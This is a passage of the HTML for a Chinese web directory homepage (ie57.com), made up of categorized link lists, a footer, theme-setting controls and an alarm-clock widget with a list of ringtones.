                                        <dd><a href="http://www.sc-cn.net">素材中国</a></dd>
                                        <dd><a href="http://www.zcool.com.cn/">站酷素材</a></dd>
                                        <dd><a href="http://sc.chinaz.com/">站长素材</a></dd>
                                        <dd><a href="http://www.27.cn/jptk/index.html">性感美女</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/tiyu/" >体育</a></dt>
                                        <dd><a href="http://china.nba.com/">NBA中文网</a></dd>
                                        <dd><a href="http://sports.sohu.com/">搜狐体育</a></dd>
                                        <dd><a href="http://sports.cn.yahoo.com/index.html?f=E114_3_1">雅虎体育</a></dd>
                                        <dd><a href="http://sports.163.com/">网易体育</a></dd>
                                        <dd><a href="http://sports.qq.com/">腾讯体育</a></dd>
                                        <dd><a href="http://sports.tom.com/">鲨威体坛</a></dd>
                                        <dd><a href="http://sports.sina.com.cn/">新浪体育</a></dd>
                                    </dl>
                            <dl><dt><a href="html/bbs/" >论坛</a></dt>
                                        <dd><a href="http://tieba.baidu.com/">百度贴吧</a></dd>
                                        <dd><a href="http://www.tianya.cn/">天涯社区</a></dd>
                                        <dd><a href="http://bbs.ifeng.com">凤凰论坛</a></dd>
                                        <dd><a href="http://q.sohu.com/">搜狐圈子</a></dd>
                                        <dd><a href="http://club.163.com/">网易社区</a></dd>
                                        <dd><a href="http://bbs.ik123.com/">音乐论坛</a></dd>
                                    </dl>
                        </div>
            <!--/ list-->
        </div><!--/ coolsite-->
    </div><!--/ main-->
    <div id="cate" class="bd">
                        <h2>娱乐休闲</h2>
        <ul>
                        <li ><a href="http://www.ie57.com/html/music/index.htm">音乐</a></li>
                        <li ><a href="http://www.ie57.com/html/vedio/index.htm">视频</a></li>
                        <li ><a href="http://www.ie57.com/html/games/index.htm">游戏</a></li>
                        <li ><a href="http://www.ie57.com/html/news/index.htm">新闻</a></li>
                        <li ><a href="http://www.ie57.com/html/movie/index.htm">电影</a></li>
                        <li ><a href="http://www.ie57.com/html/xiaoshuo/index.htm">小说</a></li>
                        <li ><a href="http://www.ie57.com/html/tiyu/index.htm">体育</a></li>
                        <li ><a href="http://www.ie57.com/html/football/index.htm">足球</a></li>
                        <li ><a href="http://www.ie57.com/html/nba/index.htm">NBA</a></li>
                        <li ><a href="http://www.ie57.com/html/bizhi/index.htm">美图</a></li>
                        <li ><a href="http://www.ie57.com/html/xingzuo/index.htm">星相</a></li>
                        <li ><a href="http://www.ie57.com/html/dongman/index.htm">动漫</a></li>
                        <li ><a href="http://www.ie57.com/html/fun/index.htm">笑话</a></li>
                        <li ><a href="http://www.ie57.com/html/bbs/index.htm">社区</a></li>
                        <li ><a href="http://www.ie57.com/html/love/index.htm">交友</a></li>
                        <li ><a href="http://www.ie57.com/html/star/index.htm">明星</a></li>
                        <li ><a href="http://www.ie57.com/html/sheying/index.htm">摄影</a></li>
                        <li ><a href="http://www.ie57.com/html/junshi/index.htm">军事</a></li>
                        <li ><a href="/html/catalog/game.htm">网游</a></li>
                        <li ><a href="http://www.ie57.com/html/xiaoyouxi/index.htm">小游戏</a></li>
                    </ul>
                <h2>生活服务</h2>
        <ul>
                        <li ><a href="http://tool.115.com/tianqi/">天气</a></li>
                        <li ><a href="http://tool.114la.com/">查询</a></li>
                        <li ><a href="http://www.ie57.com/html/gupiao/index.htm">股票</a></li>
                        <li ><a href="http://www.ie57.com/html/jijin/index.htm">基金</a></li>
                        <li ><a href="http://www.ie57.com/html/gouwu/index.htm">购物</a></li>
                        <li ><a href="http://www.ie57.com/html/bank/index.htm">银行</a></li>
                        <li ><a href="http://www.ie57.com/html/car/index.htm">汽车</a></li>
                        <li ><a href="http://www.ie57.com/html/house/index.htm">房产</a></li>
                        <li ><a href="http://www.ie57.com/html/caipiao/index.htm">彩票</a></li>
                        <li ><a href="http://www.ie57.com/html/shouji/index.htm">手机</a></li>
                        <li ><a href="http://www.ie57.com/html/health/index.htm">健康</a></li>
                        <li ><a href="http://www.ie57.com/html/law/index.htm">法律</a></li>
                        <li ><a href="http://www.ie57.com/html/qinzi/index.htm">亲子</a></li>
                        <li ><a href="http://www.ie57.com/html/lady/index.htm">女性</a></li>
                        <li ><a href="http://www.ie57.com/html/sex/index.htm">两性</a></li>
                        <li ><a href="http://www.ie57.com/html/pet/index.htm">宠物</a></li>
                        <li ><a href="http://www.ie57.com/html/travel/index.htm">旅游</a></li>
                        <li ><a href="http://www.ie57.com/html/fashion/index.htm">时尚</a></li>
                        <li ><a href="http://www.ie57.com/html/foods/index.htm">美食</a></li>
                        <li ><a href="http://www.ie57.com/html/tongxin/index.htm">通信</a></li>
                        <li ><a href="http://www.ie57.com/html/rencai/index.htm">招聘</a></li>
                        <li ><a href="http://www.ie57.com/html/life/index.htm">生活</a></li>
                        <li ><a href="http://www.ie57.com/html/yule/index.htm">娱乐</a></li>
                        <li ><a href="http://www.ie57.com/html/map/index.htm">地图</a></li>
                    </ul>
                <h2>电脑网络</h2>
        <ul>
                        <li ><a href="http://www.ie57.com/html/it/index.htm">IT</a></li>
                        <li ><a href="http://www.ie57.com/html/mail/index.htm">邮箱</a></li>
                        <li ><a href="http://www.ie57.com/html/soft/index.htm">软件</a></li>
                        <li ><a href="http://www.ie57.com/html/computer/index.htm">电脑</a></li>
                        <li ><a href="http://www.ie57.com/html/Heike_Anquan/index.htm">黑客</a></li>
                        <li ><a href="http://www.ie57.com/html/BT/index.htm">BT</a></li>
                        <li ><a href="http://www.ie57.com/html/desktop/index.htm">桌面</a></li>
                        <li ><a href="http://www.ie57.com/html/blog/index.htm">博客</a></li>
                        <li ><a href="http://www.ie57.com/html/liaotian_qq/index.htm">聊天</a></li>
                        <li ><a href="http://www.ie57.com/html/Yingjian_Zixun/index.htm">硬件</a></li>
                        <li ><a href="http://www.ie57.com/html/shuma_shishang/index.htm">数码</a></li>
                        <li ><a href="http://www.ie57.com/html/Sousuo_Yinqing/index.htm">搜索</a></li>
                        <li ><a href="http://www.ie57.com/html/design/index.htm">设计</a></li>
                        <li ><a href="http://www.ie57.com/html/Chengxu_Biancheng/index.htm">编程</a></li>
                        <li ><a href="http://www.ie57.com/html/Jianzhan_Sheji/index.htm">建站</a></li>
                        <li ><a href="http://www.ie57.com/html/flash-show/index.htm">Flash</a></li>
                        <li ><a href="http://qq.114la.com/">非主流</a></li>
                    </ul>
                <h2>文化教育</h2>
        <ul>
                        <li ><a href="http://www.ie57.com/html/jiaoyu/index.htm">教育</a></li>
                        <li ><a href="http://www.ie57.com/html/kexue_jishu/index.htm">科技</a></li>
                        <li ><a href="http://www.ie57.com/html/waiyu_xuexi/index.htm">外语</a></li>
                        <li ><a href="http://www.ie57.com/html/kaoshi/index.htm">考试</a></li>
                        <li ><a href="http://www.ie57.com/html/gaokao/index.htm">高考</a></li>
                        <li ><a href="http://www.ie57.com/html/kaoyan/index.htm">考研</a></li>
                        <li ><a href="http://www.ie57.com/html/xiaoyuan_gaoxiao/index.htm">大学</a></li>
                        <li ><a href="http://www.ie57.com/html/kejian_lunwen/index.htm">论文</a></li>
                        <li ><a href="http://www.ie57.com/html/xiaoyuan/index.htm">校园</a></li>
                        <li ><a href="http://www.ie57.com/html/quyi/index.htm">曲艺</a></li>
                        <li ><a href="http://www.ie57.com/html/shehui_wenhua/index.htm">人文</a></li>
                        <li ><a href="http://www.ie57.com/html/chuguo_liuxue/index.htm">留学</a></li>
                        <li ><a href="http://www.ie57.com/html/yishu_aihao/index.htm">爱好</a></li>
                        <li ><a href="http://www.ie57.com/html/zongjiao/index.htm">宗教</a></li>
                        <li ><a href="http://www.ie57.com/html/gongyi/index.htm">公益</a></li>
                    </ul>
                <h2>其他类别</h2>
        <ul class="c2">
                        <li ><a href="http://www.ie57.com/html/zhaoshang/index.htm">招商加盟</a></li>
                        <li ><a href="html/local/index.htm">地方服务</a></li>
                        <li ><a href="http://www.ie57.com/html/zhengfu/index.htm">政府部门</a></li>
                        <li ><a href="html/trade_sites.htm">行业网站</a></li>
                        <li ><a href="http://www.ie57.com/html/guowai/index.htm">国外网站</a></li>
                        <li ><a href="http://www.ie57.com/html/dianshi/index.htm">电视电台</a></li>
                        <li ><a href="http://www.ie57.com/html/wap/index.htm">Wap网址</a></li>
                        <li ><a href="http://www.ie57.com/html/shadu/index.htm">杀毒防毒</a></li>
                        <li ><a href="http://www.ie57.com/html/free/index.htm">免费资源</a></li>
                        <li ><a href="http://www.ie57.com/html/lipin/index.htm">鲜花礼品</a></li>
                        <li ><a href="http://www.ie57.com/html/cool/index.htm">奇趣酷站</a></li>
                        <li ><a href="http://www.ie57.com/html/webtool/index.htm">站长工具</a></li>
                    </ul>
                    
    </div><!--/ cate-->
</div><!--/ content-->
<div id="location">
    <ul>
                        <li class="bd">
            <strong>网络游戏</strong>
                        <a href="http://www.ie57.com/html/catalog/game.htm#11">魔兽世界</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#39">天龙八部</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#78">地下城与勇士</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#15">梦幻西游</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#42">《诛仙》</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#83">传奇外传</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#27">《问道》</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#81">穿越火线</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#20">热血江湖</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#18">劲舞团</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#16">跑跑卡丁车</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#101">Aion永恒之塔</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#25">反恐精英CS</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#14">街头篮球</a>
                        <span class="more"><a href="http://www.ie57.com/html/catalog/game.htm">更多...</a></span>
        </li>
                <li class="bd">
            <strong>单机游戏</strong>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#26">魔兽争霸</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#22">红色警戒</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#49">暗黑破坏神II</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#54">帝国时代</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#52">足球 FIFA</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#48">极品飞车</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#50">侠盗飞车</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#47">PSP掌机</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#41">连连看</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#53">超级玛丽</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#51">祖玛/泡泡龙</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#46">做饭游戏</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#45">化妆游戏</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#44">休闲小游戏</a>
                        <span class="more"><a href="http://www.ie57.com/html/catalog/game1.htm">更多...</a></span>
        </li>
                <li class="bd">
<strong>地方服务</strong> 
<a  href="http://www.ie57.com/html/local/beijing.htm" title="北京">北京</a>
<a  href="http://www.ie57.com/html/local/tianjin.htm" title="天津">天津</a>
<a  href="http://www.ie57.com/html/local/hebei.htm" title="河北">河北</a>
<a  href="http://www.ie57.com/html/local/shanxi.htm" title="山西">山西</a>
<a  href="http://www.ie57.com/html/local/neimenggu.htm" title="内蒙古">内蒙古</a>
<a  href="http://www.ie57.com/html/local/liaoning.htm" title="辽宁">辽宁</a>
<a  href="http://www.ie57.com/html/local/jilin.htm" title="吉林">吉林</a>
<a  href="http://www.ie57.com/html/local/heilongjiang.htm" title="黑龙江">黑龙江</a>
<a  href="http://www.ie57.com/html/local/shanghai.htm" title="上海">上海</a>
<a  href="http://www.ie57.com/html/local/jiangsu.htm" title="江苏">江苏</a>
<a  href="http://www.ie57.com/html/local/zhejiang.htm" title="浙江">浙江</a>
<a  href="http://www.ie57.com/html/local/anhui.htm" title="安徽">安徽</a>
<a  href="http://www.ie57.com/html/local/fujian.htm" title="福建">福建</a>
<a  href="http://www.ie57.com/html/local/jiangxi.htm" title="江西">江西</a>
<a  href="http://www.ie57.com/html/local/shandong.htm" title="山东">山东</a>
<a  href="http://www.ie57.com/html/local/henan.htm" title="河南">河南</a>
<a  href="http://www.ie57.com/html/local/hubei.htm" title="湖北">湖北</a>
<a  href="http://www.ie57.com/html/local/hunan.htm" title="湖南">湖南</a>
<a  href="http://www.ie57.com/html/local/guangdong.htm" title="广东">广东</a>
<a  href="http://www.ie57.com/html/local/guangxi.htm" title="广西">广西</a>
<a  href="http://www.ie57.com/html/local/hainan.htm" title="海南">海南</a>
<a  href="http://www.ie57.com/html/local/chongqing.htm" title="重庆">重庆</a>
<a  href="http://www.ie57.com/html/local/sichuan.htm" title="四川">四川</a>
<a  href="http://www.ie57.com/html/local/guizhou/.htm" title="贵州">贵州</a>
<a  href="http://www.ie57.com/html/local/yunnan.htm" title="云南">云南</a>
<span class="more"><a href="http://www.ie57.com/html/local/">更多...</a></span>
        </li>
        
    </ul>
</div><!--/ location--><div id="footer"> <a href="#" target="_blank">关于我们</a> | <a href="http://www.ie57.com/url-submit/" target="_blank">网站提交</a> | <a href="http://www.ie57.com/feedback" target="_blank">意见反馈</a> | <a href="#" target="_blank">公益活动</a> 
            <div class="hr"></div>
            <p> 绿网之家www.ie57.com &copy;2005-2010 . 粤ICP备09157283号
        </div>
        <!--/ footer-->
        <div style="display: none;" class="bd" id="weatherBox">
            <div class="head"><a title="关闭" id="closeWTBOX" class="close">关闭</a><span style="float:left;">#{postTime}</span></div>
            <h2>#{city} #{more}</h2>
            #{weather} </div>
        <div id="setting-box" class="bd" style="display:none">
            <h2 id="setting2">个性设置</h2>
            <ul>
                <li id="layout-setting"> <strong>屏幕设置：</strong> <a rel="0" class="a">经典版</a> <a rel="1" class="b">标准版</a> <a rel="2" class="c">宽屏版</a> </li>
                <li id="style-setting" class="theme"> <strong>风格设置：</strong> <a rel="0" class="blue">0</a> <a rel="1" class="orange">1</a> <a rel="2" class="green">2</a> <a rel="3" class="purple">3</a> <a rel="4" class="blue2">4</a> </li>
                <li id="font-setting"> <strong>字体颜色：</strong> <a rel="default" class="default">蓝</a> <a rel="gray" class="gray">灰</a> <a rel="black" class="black">黑</a> <a rel="green" class="green">绿</a> <a rel="pink" class="pink">粉红</a> <a rel="red" class="red">红色</a> </li>
                <li id="bg-setting"> <strong>背景图片：</strong>
                    <div id="bg-item" class="con"> <a rel="default" class="default">无</a> <a rel="1.gif">1</a> <a rel="2.gif">2</a> <a rel="3.gif">3</a> <a rel="4.gif">4</a> <a rel="5.jpg">5</a> <a rel="6.jpg">6</a> <a rel="7.gif">6</a> </div>
                </li>
            </ul>
            <div class="center">
                <button id="setting-reset" onclick="Skinselector.Reset()" class="button">恢复默认</button>
                &nbsp;&nbsp;
                <button id="setting-close" class="button">完 成</button>
            </div>
        </div>
        <!--/ settingBox-->
        
        <!-- clock start -->
        <div id="clockBox" class="bd alertbox" style="display:none;">
            <h2 id="closeClock">闹钟</h2>
            <div class="conBox">
                <div class="cloBox">
                    <div class="todays bd"></div>
                    <div class="tools" style="display:block;">
                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
                            <tr>
                                <th width="28%">提醒时间：</th>
                                <td width="72%"><select id="selectHour">
                                        23
                                    </select>
                                    时
                                    <select id="selectMinute">
                                        60
                                    </select>
                                    分 </td>
                            </tr>
                            <tr>
                                <th>闹钟铃声：</th>
                                <td><label>
                                        <select id="selectMusic" name="selectMusic">
                                            <option value='static/media/clock/1.mid'>爱如潮水</option>
                                            <option value='static/media/clock/2.mid'>春江花月夜</option>
                                            <option value='static/media/clock/3.mid'>二泉映月</option>
                                            <option value='static/media/clock/4.mid'>回家</option>
                                            <option value='static/media/clock/5.mid'>卡农</option>
                                            <option value='static/media/clock/6.mid'>梁祝</option>
                                            <option value='static/media/clock/7.mid'>浏阳河</option>
                                            <option value='static/media/clock/8.mid'>茉莉花</option>
                                            <option value='static/media/clock/9.mid'>南泥湾</option>
                                            <option value='static/media/clock/10.mid'>起床号</option>
                                            <option value='static/media/clock/11.mid'>千里之外</option>
                                            <option value='static/media/clock/12.mid'>上海滩</option>
                                            <option value='static/media/clock/13.mid'>水边的阿迪丽娜</option>
                                            <option value='static/media/clock/14.mid'>天仙配</option>
                                            <option value='static/media/clock/15.mid'>甜蜜蜜</option>
                                            <option value='static/media/clock/16.mid'>土耳其进行曲</option>
                                            <option value='static/media/clock/17.mid'>我只在乎你</option>
                                            <option value='static/media/clock/18.mid'>星语心愿</option>
                                            <option value='static/media/clock/19.mid'>致爱丽丝</option>
                                            <option value='static/media/clock/20.mid'>猪八戒背媳妇</option>
                                            <option value='static/media/clock/21.mid'>最浪漫的事</option>
                                        </select>
                                        &nbsp;
                                        <button id='alarm_music_button' style="height:22px; padding:0;">试听</button>
                                    </label></td>
                                <BGSOUND id='alarm_player' src='' autostart=true  loop=2>
                            </tr>
                            <tr>
                                <th>提示文字：</th>
                                <td><input id="alarm_textarea" maxlength=40 value="休息，休息一下吧！"></td>
                            </tr>
                            <tr>
                                <th>重复提醒：
                                    </td>
                                <td><div id="is_single">
                                        <label for="noRepeat" style="cursor:pointer">
                                            <input type="radio" id="noRepeat" name="alarm_is_single" checked value="1" />
                                            不重复</label>
                                        <label for="repeatDaily" style="cursor:pointer">
                                            <input type="radio" name="alarm_is_single" id="repeatDaily" value="0" />
                                            每天提醒</label>
                                    </div></td>
                            </tr>
                            <tr>
                                <td colspan="2"><a id="confirmed" onclick="Ylclock.set()" href="javascript:void(0)" target="_parent">添加提醒</a> <a id="cancelBtn" href="javascript:void(0)" target="_parent">关闭</a></td>
                            </tr>
                        </table>
                        <ul class="listC">
                        </ul>
                    </div>
                    <div class="point bd">
                        <h3><strong>ie57小秘书温馨提示：</strong></h3>
                        <p>·如关闭ie57网址导航首页，闹钟功能将失效。</p>
                        <p>·需要打开音响或佩戴耳机，以便听到提示铃声。</p>
                    </div>
                </div>
            </div>
        </div>
        <!-- clock end -->
        
        
    </div>
    <!--/ wrap-->
</div>
<!--/ home-->
<script type="text/javascript" src="themes/default/js/home.js"></script>
<div style="display:none"><script language="JavaScript" type="text/javascript" src="/js/tj.js"></script></div>
</body>
</html>